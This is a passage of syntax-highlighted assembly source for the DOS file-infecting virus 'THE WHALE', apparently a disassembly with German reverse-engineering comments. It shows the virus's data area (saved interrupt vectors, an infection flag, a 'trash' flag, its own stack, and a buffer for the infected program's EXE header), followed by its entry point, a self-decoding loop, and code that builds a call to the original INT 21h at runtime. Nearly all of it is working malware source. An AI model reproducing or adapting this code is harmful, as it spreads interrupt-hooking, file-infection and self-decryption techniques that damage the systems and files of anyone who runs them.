</span><span class="sc5">Trace_Adres</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Temp-DD fÅr Trace-Adresse</span><span class="sc0">
</span><span class="sc5">D2431</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D2433</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; "1" : Nach Verschluesselung INT 21h</span><span class="sc0">
                                </span><span class="sc1">; ausfÅhren und wieder Entschluesseln.</span><span class="sc0">
</span><span class="sc5">D2434</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Low_INT_21H</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; IBMDOS-Adresse INT 21h</span><span class="sc0">
</span><span class="sc5">@Int_13h</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Adresse INT 13h</span><span class="sc0">
</span><span class="sc5">D243D</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Adresse INT 24H</span><span class="sc0">
</span><span class="sc5">PSP_SEG</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; PSP-SEGMENT</span><span class="sc0">
</span><span class="sc5">D2443</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D2445</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D2447</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Erster MCB / Tracesegment</span><span class="sc0">
</span><span class="sc5">D2449</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------( wird "JMP CS:2256" )---</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------( also "JMP VirInt21")---</span><span class="sc0">
</span><span class="sc5">D244B</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D244C</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D244E</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">D2450</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Trace-Kontrollwort</span><span class="sc0">
</span><span class="sc5">D2452</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">14h</span><span class="sc0">     </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">D247A</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">14h</span><span class="sc0">     </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">D24A2</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@PSP</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Aktuelles PSP-Segment</span><span class="sc0">
</span><span class="sc5">FilePos</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; File-Pos</span><span class="sc0">
</span><span class="sc5">FileSize</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; File-Size</span><span class="sc0">
</span><span class="sc5">D24AD</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Offset des Caller-Lese-Puffers</span><span class="sc0">
</span><span class="sc5">D24AF</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Anzahl der zu lesenden Byte</span><span class="sc0">
</span><span class="sc5">D24B1</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D24B3</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; CALLERS - Flags !</span><span class="sc0">
</span><span class="sc5">D24B5</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">@FCB</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">25h</span><span class="sc0">     </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; FCB</span><span class="sc0">
</span><span class="sc10">Error</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; ERROR aufgetreten ; 24DA</span><span class="sc0">
</span><span class="sc5">D24DB</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D24DD</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; PLatz fÅr SS</span><span class="sc0">
</span><span class="sc5">D24DF</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Platz fÅr SP</span><span class="sc0">
</span><span class="sc5">D24E1</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D24E3</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Platz fÅr AX</span><span class="sc0">
</span><span class="sc5">D24E4</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">D24E6</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Caller-IP ?</span><span class="sc0">
</span><span class="sc5">D24E8</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Caller-CS ?</span><span class="sc0">
</span><span class="sc5">D24EA</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Returnadresse zwischen Push/Pop</span><span class="sc0">
</span><span class="sc5">D24EC</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">D24EE</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D24EF</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">D24F0</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">EPB</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Start EPB</span><span class="sc0">
</span><span class="sc5">D24F2</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; File-Attribut</span><span class="sc0">
</span><span class="sc5">D24F4</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Offset Filename / ASCIIZ</span><span class="sc0">
</span><span class="sc5">D24F6</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Segment Filename / ASCIIZ</span><span class="sc0">
</span><span class="sc5">D24F8</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">D24FA</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">D24FC</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D24FE</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">D24FF</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; SP-init</span><span class="sc0">
</span><span class="sc5">D2501</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; SS-init</span><span class="sc0">
</span><span class="sc5">D2503</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; IP-init</span><span class="sc0">
</span><span class="sc5">D2505</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; CS-init</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Cmd_Line</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">50H</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; command-line</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">D2557</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Orig.SP</span><span class="sc0">
</span><span class="sc5">D2559</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Orig.SS</span><span class="sc0">
</span><span class="sc5">Vir_SP</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Vir. SP</span><span class="sc0">
</span><span class="sc5">D245D</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D245F</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D2560</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Platz fÅr AX</span><span class="sc0">
</span><span class="sc5">D2562</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Platz fÅr BX</span><span class="sc0">
</span><span class="sc5">D2564</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Platz fÅr CX</span><span class="sc0">
</span><span class="sc1">;-------------------------------( als virtuelle Code-Area genutzt )---</span><span class="sc0">
</span><span class="sc5">@INT21</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; ADRESSE Original INT 21H</span><span class="sc0">
</span><span class="sc5">D256A</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D256C</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D256E</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------( wird "JMP CS:2273"  )---</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------( also "JMP VirInt09" )---</span><span class="sc0">
</span><span class="sc5">D2570</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D2571</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D2573</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">D2575</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; SAVE SI</span><span class="sc0">
</span><span class="sc5">D2577</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; SAVE DI</span><span class="sc0">
</span><span class="sc5">D2579</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; SAVE AX</span><span class="sc0">
</span><span class="sc5">D257B</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; SAVE DS</span><span class="sc0">
</span><span class="sc5">D257D</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; SAVE ES</span><span class="sc0">
</span><span class="sc5">D257F</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; SAVE CX</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">D2581</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; SAVE BX</span><span class="sc0">
</span><span class="sc5">INT_09</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Original INT 09</span><span class="sc0">
</span><span class="sc5">D2587</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; wird bei J02975 geschrieben</span><span class="sc0">
</span><span class="sc5">D2588</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D258A</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">InfectFlag</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; "1" nach der ersten Infektion</span><span class="sc0">
</span><span class="sc5">D258D</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D258E</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Platz fÅr Flags</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">D2590</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; SAVE DX</span><span class="sc0">
</span><span class="sc5">@INT02</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Originaler INT 02</span><span class="sc0">
</span><span class="sc5">TrashFlag</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; "1" : Statt einer Infektion,</span><span class="sc0">
                                        </span><span class="sc1">;     wird Trash weggeschrieben</span><span class="sc0">
</span><span class="sc5">D2597</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D2598</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; hier kommt z.B. "HLT" hin...</span><span class="sc0">
</span><span class="sc5">D259A</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">D259C</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D25A0</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">160h</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">D2700</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">; VIRUS-STACK -^^^</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">100</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">J02801</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">J02802</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">J02803</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">J02804</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">J02805</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">J02806</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">J02807</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J02808</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4Ch</span><span class="sc0">          </span><span class="sc1">; main() :-)))</span><span class="sc0">
                        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc5">ErrorCode</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
</span><span class="sc5">ErrorCode</span><span class="sc0">               </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Hier beginnt WHALE</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">VIRSTART</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">;02810</span><span class="sc0">
</span><span class="sc5">J02811</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Decode_Whale</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;======( Puffer fÅr die ersten 1Ch Byte des infizierten Programmes)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">EXE_ID</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">04CB4H</span><span class="sc0">          </span><span class="sc1">; 'MZ'      / MOV AH,4C</span><span class="sc0">
</span><span class="sc5">EXE_LastBytes</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">021CDH</span><span class="sc0">          </span><span class="sc1">; Lastbytes / INT 21</span><span class="sc0">
</span><span class="sc5">EXE_Pages</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Pages</span><span class="sc0">
</span><span class="sc5">EXE_Rel_Count</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Reloc-Count</span><span class="sc0">
</span><span class="sc5">EXE_Paras</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Headerpara</span><span class="sc0">
</span><span class="sc5">EXE_MinFree</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; minfree</span><span class="sc0">
</span><span class="sc5">EXE_MaxFree</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; maxfree</span><span class="sc0">
</span><span class="sc5">EXE_SS_INIT</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; ss-init</span><span class="sc0">
</span><span class="sc5">EXE_SP_INIT</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; sp-init</span><span class="sc0">
</span><span class="sc5">EXE_ByteSum</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; bytesum</span><span class="sc0">
</span><span class="sc5">EXE_CODE_INIT</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; ip-init, cs-init</span><span class="sc0">
</span><span class="sc5">EXE_Reloc_Ofs</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">Dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; reloc-offset</span><span class="sc0">
</span><span class="sc5">EXE_Ovl_Num</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; ovl-num</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">@FIRSTBYTE</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;&lt;----------------( erstes Byte im oberen Segment )---</span><span class="sc0">
</span><span class="sc5">EXE_FLAG</span><span class="sc0">                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; "1" : EXE-FILE</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==================================( erster CALL nach Dekodierung )===</span><span class="sc0">
</span><span class="sc1">;==================================( 'echter' Einsprung           )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Offset_2831</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ENTRY</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0288E</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Vir_NAME</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"THE WHALE"</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">036h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c7h</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------(trash?)---</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
</span><span class="sc5">J02842</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0458h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; evtl Cursor-Loc auf</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J0284C</span><span class="sc0">                  </span><span class="sc1">; page 5 (??!??)</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02A4F</span><span class="sc0">                  </span><span class="sc1">; -&gt; Nirwana</span><span class="sc0">
</span><span class="sc1">;====================================================()===============</span><span class="sc0">
</span><span class="sc5">J0284C</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc5">J02852</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J0287E</span><span class="sc0">                  </span><span class="sc1">; = RET nach altem BX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J0284C</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">9fh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==================( folgender Code wird an Adresse 2566h erzeugt )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;@INT21:        DW      2568h           ; fÅr "call word ptr [@int21]"</span><span class="sc0">
</span><span class="sc1">;D2568:         PUSHF</span><span class="sc0">
</span><span class="sc1">;               CALL    FAR CS:[Low_INT_21H]  ; CALL OLD INT 21</span><span class="sc0">
</span><span class="sc1">;               RET</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CreateTempCode</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">@INT21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">2E9Ch</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">                 </span><span class="sc1">; SIC !</span><span class="sc0">
